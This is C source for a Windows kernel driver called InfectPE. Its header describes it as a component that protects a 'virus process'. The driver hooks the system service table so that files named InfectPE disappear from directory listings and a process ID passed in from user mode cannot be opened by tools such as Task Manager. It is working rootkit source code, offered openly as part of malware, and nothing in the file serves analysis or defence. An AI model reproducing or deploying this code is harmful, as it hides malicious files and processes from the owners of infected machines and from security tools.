/*

  Module: InfectPE.c
  by lazy_cat

  Environment: Kernel Mode
  
  Desc:
      This driver is responsible for protecting the user mode virus process(e.g.,hiding the process
	  name from taskmgr.exe;hiding file form explorer.exe. To archieve this goal,I use SSDT hook,
	  but it cann't run on VISTA and later OS.).

*/

#include <ntddk.h>
#include "InfectPE.h"


#ifdef  ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, InfectpeUnload)
#endif  /* ALLOC_PRAGMA */


extern PSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable; // exported by ntoskrnl.exe


// used for save original function address
PNTQUERYDIRECTORYFILE   g_pOldNtQueryDirectoryFile = NULL;   
PNTOPENPROCESS			g_pOldNtOpenProcess = NULL;


ULONG					g_ulProcessID = 0;
SHOW_INFO				g_ShowInfo[]  = {
											IRP_MJ_READ,    "IRP_MJ_READ",
											IRP_MJ_WRITE,   "IRP_MJ_WRITE",
											IRP_MJ_CREATE,  "IRP_MJ_CREATE",
											IRP_MJ_CLOSE,   "IRP_MJ_CLOSE",
											IRP_MJ_CLEANUP, "IRP_MJ_CLEANUP"
};


NTSTATUS
DriverEntry (
	IN PDRIVER_OBJECT		DriverObject,
	IN PUNICODE_STRING		RegistryPath
	)
{
	int		i = 0;
	//
	// Prepare for communicate with RING 3
	//
	PDEVICE_OBJECT    pDeviceObject = NULL;
	PDEVICE_EXTENSION pDeviceEx = NULL;
	UNICODE_STRING	  ustrDeviceName;
	RtlInitUnicodeString(&ustrDeviceName, L"\\Device\\InfectPE");
	if (NT_SUCCESS(IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &ustrDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject)))
	{
		pDeviceEx = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
		pDeviceEx->pDeviceObject = pDeviceObject;

		RtlInitUnicodeString(&pDeviceEx->ustrSymbolicName, L"\\DosDevices\\InfectPE");
		if (!NT_SUCCESS(IoCreateSymbolicLink(&pDeviceEx->ustrSymbolicName, &ustrDeviceName)))
			KdPrint(("[by lazy_cat] IoCreateSymbolicLink failed.\n"));
	}
	else
		KdPrint(("[by lazy_cat] IoCreateDevice failed.\n"));

	//
	// Set dispatch routine
	//
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = InfectpeDispatch;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = InfectpeDispatchDeviceControl;
	DriverObject->DriverUnload = InfectpeUnload;

	//
	// SSDT HOOK
	//
    KdPrint(("[by lazy_cat] 0x%08X 0x%08X 0x%08X 0x%08X\n", KeServiceDescriptorTable->ntoskrnl.ServiceTableBase, 
        KeServiceDescriptorTable->ntoskrnl.ServiceCounterTableBase,
        KeServiceDescriptorTable->ntoskrnl.NumberOfService,
        KeServiceDescriptorTable->ntoskrnl.ParamTableBase));
	
    // NtQueryDirectoryFile function address index
    KdPrint(("[by lazy_cat] NtQueryDirectoryFile's index: %d\n", ServiceIndex(ZwQueryDirectoryFile)));
	KdPrint(("[by lazy_cat] NtOpenProcess's index: %d\n", ServiceIndex(ZwOpenProcess)));

    // save original function address
    g_pOldNtQueryDirectoryFile = (PNTQUERYDIRECTORYFILE)KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[ServiceIndex(ZwQueryDirectoryFile)];
    g_pOldNtOpenProcess = (PNTOPENPROCESS)KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[ServiceIndex(ZwOpenProcess)];
	KdPrint(("[by lazy_cat] Original NtQueryDirectoryFile address: %08X\n", g_pOldNtQueryDirectoryFile));
	KdPrint(("[by lazy_cat] Original NtOpenProcess address: %08X\n", g_pOldNtOpenProcess));
	
    // HOOK
    KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[ServiceIndex(ZwQueryDirectoryFile)] = (ULONG)InfectpeNtQueryDirectoryFile;
	KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[ServiceIndex(ZwOpenProcess)] = (ULONG)InfectpeNtOpenProcess;
    return STATUS_SUCCESS;
}


NTSTATUS
NTAPI
InfectpeNtQueryDirectoryFile (
    __in		HANDLE  FileHandle,
    __in_opt	HANDLE  Event,
    __in_opt	PIO_APC_ROUTINE  ApcRoutine,
    __in_opt	PVOID  ApcContext,
    __out		PIO_STATUS_BLOCK  IoStatusBlock,
    __out		PVOID  FileInformation,
    __in		ULONG  Length,
    __in		FILE_INFORMATION_CLASS  FileInformationClass,
    __in		BOOLEAN  ReturnSingleEntry,
    __in_opt	PUNICODE_STRING  FileName,
    __in		BOOLEAN  RestartScan
    )
{
    NTSTATUS	status = STATUS_UNSUCCESSFUL;
	PVOID		pCurrent  = NULL;
	CHAR		*pStart = NULL, *pDestination = NULL;
	FILE_BOTH_DIR_INFORMATION	*pLastEntry = NULL;
	ULONG		ulLengthToCopy = 0;
    KdPrint(("[by lazy_cat] Enter InfectpeNtQueryDirectoryFile\n"));
    status = g_pOldNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
        Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[by lazy_cat] NtQueryDirectoryFile() returns an error.\n"));
		KdPrint(("[by lazy_cat] Leave InfectpeNtQueryDirectoryFile\n"));
		return status;
	}
	
	// reconstruct the link list.		
	if (!(pStart = ExAllocatePoolWithTag(PagedPool, Length, 'vxer')))
	{
		KdPrint(("[by lazy_cat] ExAllocatePoolWithTag() failed.\n"));
		KdPrint(("[by lazy_cat] Leave InfectpeNtQueryDirectoryFile\n"));
		return	status;
	}
	pDestination = pStart;
	RtlZeroMemory(pStart, Length);
	switch (FileInformationClass)
	{
	case FileBothDirectoryInformation:	// FILE_BOTH_DIR_INFORMATION
		pLastEntry = pCurrent = FileInformation;
		while (TRUE)
		{
			// passthru the InfectPE...
			if (16 != RtlCompareMemory(((FILE_BOTH_DIR_INFORMATION*)pCurrent)->FileName, L"InfectPE", 16))
			{
				ulLengthToCopy = ((FILE_BOTH_DIR_INFORMATION*)pCurrent)->NextEntryOffset;
				KdPrint(("[by lazy_cat] File Name: %ws\n", ((FILE_BOTH_DIR_INFORMATION*)pCurrent)->FileName));
				if (!ulLengthToCopy)
				{
					ulLengthToCopy = sizeof(FILE_BOTH_DIR_INFORMATION) + ((FILE_BOTH_DIR_INFORMATION*)pCurrent)->FileNameLength;
				}
				RtlCopyMemory(pDestination, pCurrent, ulLengthToCopy);
				pLastEntry = (FILE_BOTH_DIR_INFORMATION*)pDestination;
				pDestination += ulLengthToCopy;
			}
			else
			{
				WCHAR	szFileName[256] = { 0 };
				RtlCopyBytes(szFileName, ((FILE_BOTH_DIR_INFORMATION*)pCurrent)->FileName, ((FILE_BOTH_DIR_INFORMATION*)pCurrent)->FileNameLength);
				KdPrint(("[by lazy_cat] Detect [%ws], this file will not show in explorer.exe\n", szFileName));
			}
			
			if (((FILE_BOTH_DIR_INFORMATION*)pCurrent)->NextEntryOffset) 
				pCurrent = (char*)pCurrent + ((FILE_BOTH_DIR_INFORMATION*)pCurrent)->NextEntryOffset;
			else
				break;
		} // end while
		pLastEntry->NextEntryOffset = 0;
		RtlCopyMemory(FileInformation, pStart, Length);
		break;
	} // end switch
	ExFreePoolWithTag(pStart, 'vxer');
	KdPrint(("[by lazy_cat] Leave InfectpeNtQueryDirectoryFile\n"));
    return status;
}


//
// DeviceIoControl() will generate the IRP_MJ_DEVICE_CONTROL request.
//
NTSTATUS
InfectpeDispatchDeviceControl (
	__in struct _DEVICE_OBJECT  *DeviceObject,
	__in struct _IRP  *Irp
	)
{
	PIO_STACK_LOCATION	IrpSp = IoGetCurrentIrpStackLocation(Irp);
	switch (IrpSp->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_INFECTPE:
		g_ulProcessID = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;	// lpInBuffer
		*(ULONG*)Irp->AssociatedIrp.SystemBuffer = 1;				// lpOutBuffer
		KdPrint(("[by lazy_cat] Receive Process ID: %d\n", g_ulProcessID));
		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = 4;
		break;
		
	default:
		Irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
		Irp->IoStatus.Information = 0;
		break;
	}
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS
InfectpeDispatch (
	__in struct _DEVICE_OBJECT  *DeviceObject,
	__in struct _IRP  *Irp
	)
{
	int	i = 0;
	PIO_STACK_LOCATION	IrpSp = IoGetCurrentIrpStackLocation(Irp);
	for (i = 0; i < sizeof(g_ShowInfo) / sizeof(g_ShowInfo[0]); i++)
	{
		if (IrpSp->MajorFunction == g_ShowInfo[i].ulMajorFunction)
		{
			KdPrint(("[by lazy_cat] Receive IRP Request: %s\n", g_ShowInfo[i].szText));
			IoCompleteRequest(Irp, IO_NO_INCREMENT);
			return STATUS_SUCCESS;
		}
	}
	KdPrint(("[by lazy_cat] Receive Unknown IRP Request\n"));
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_UNSUCCESSFUL;
}


NTSTATUS
NTAPI
InfectpeNtOpenProcess (
	__out PHANDLE  ProcessHandle,
	__in ACCESS_MASK  DesiredAccess,
	__in POBJECT_ATTRIBUTES  ObjectAttributes,
	__in_opt PCLIENT_ID  ClientId
	)
{
	NTSTATUS	status;
	KdPrint(("[by lazy_cat] Enter InfectpeNtOpenProcess\n"));
	if (g_ulProcessID == (ULONG)ClientId->UniqueProcess) {
		KdPrint(("[by lazy_cat] Request opening the protected process, access denied\n"));
		status = STATUS_UNSUCCESSFUL;
	}
	else {
		status = g_pOldNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
	}
	KdPrint(("[by lazy_cat] Leave InfectpeNtOpenProcess\n"));
	return status;
}


VOID
InfectpeUnload (
	IN PDRIVER_OBJECT		DriverObject
	)
{
	// delete Device & SymbolicLink
	PDEVICE_OBJECT pDeviceObject = DriverObject->DeviceObject;
	if (pDeviceObject)
	{
		PDEVICE_EXTENSION	pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
		if (pDeviceExtension)
		{
			IoDeleteSymbolicLink(&pDeviceExtension->ustrSymbolicName);
			IoDeleteDevice(pDeviceExtension->pDeviceObject);
		}
	}

	// unhook
    KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[ServiceIndex(ZwQueryDirectoryFile)] = (ULONG)g_pOldNtQueryDirectoryFile;
	KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[ServiceIndex(ZwOpenProcess)] = (ULONG)g_pOldNtOpenProcess;
	KdPrint(("[by lazy_cat] NtQueryDirectoryFile has been unhooked.\n"));
	KdPrint(("[by lazy_cat] NtOpenProcess has been unhooked.\n"));
	KdPrint(("[by lazy_cat] InfectPE.sys has been unloaded.\n"));
}
